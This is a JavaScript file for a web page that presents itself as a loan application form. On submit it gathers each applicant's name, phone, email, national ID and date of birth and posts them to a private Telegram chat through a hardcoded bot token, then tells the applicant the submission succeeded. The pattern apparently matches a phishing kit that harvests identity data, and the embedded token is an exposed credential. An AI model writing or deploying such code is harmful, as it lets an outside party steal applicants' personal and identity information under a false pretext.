document.getElementById("applyForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const phone = document.getElementById("phone").value;
  const email = document.getElementById("email").value;
  const nationalId = document.getElementById("nationalId").value;
  const dobYear = document.getElementById("dobYear").value;
  const dobMonth = document.getElementById("dobMonth").value;
  const dobDay = document.getElementById("dobDay").value;
  const employment = document.getElementById("employment").value;
  const amount = document.getElementById("amount").value;
  const term = document.getElementById("term").value;

  const message = `📋 Loan Application\n\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nNational ID: ${nationalId}\nDOB: ${dobYear}-${dobMonth}-${dobDay}\nEmployment: ${employment}\nAmount: $${amount}\nTerm: ${term} months`;

  const botToken = "AAHWSirvDae8C9NpQbw-YnIh52hEEdRJfoA";
  const chatId = "8732760335";

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    if (response.ok) {
      alert("Application submitted successfully!");
      document.getElementById("applyForm").reset();
    } else {
      alert("Failed to submit application. Please try again.");
    }
  } catch (error) {
    alert("Error: " + error.message);
  }
});
// Populate DOB dropdowns
window.addEventListener("DOMContentLoaded", () => {
  const yearSelect = document.getElementById("dobYear");
  const monthSelect = document.getElementById("dobMonth");
  const daySelect = document.getElementById("dobDay");

  // Years: from 1950 to current year
  const currentYear = new Date().getFullYear();
  for (let y = currentYear; y >= 1950; y--) {
    const option = document.createElement("option");
    option.value = y;
    option.textContent = y;
    yearSelect.appendChild(option);
  }

  // Months: 1–12
  for (let m = 1; m <= 12; m++) {
    const option = document.createElement("option");
    option.value = m.toString().padStart(2, "0");
    option.textContent = m.toString().padStart(2, "0");
    monthSelect.appendChild(option);
  }

  // Days: 1–31 (default)
  function populateDays(year, month) {
    daySelect.innerHTML = "<option value=''>DD</option>";
    if (!year || !month) return;

    const daysInMonth = new Date(year, month, 0).getDate();
    for (let d = 1; d <= daysInMonth; d++) {
      const option = document.createElement("option");
      option.value = d.toString().padStart(2, "0");
      option.textContent = d.toString().padStart(2, "0");
      daySelect.appendChild(option);
    }
  }

  // Update days when year or month changes
  yearSelect.addEventListener("change", () => {
    populateDays(yearSelect.value, monthSelect.value);
  });
  monthSelect.addEventListener("change", () => {
    populateDays(yearSelect.value, monthSelect.value);
  });
});

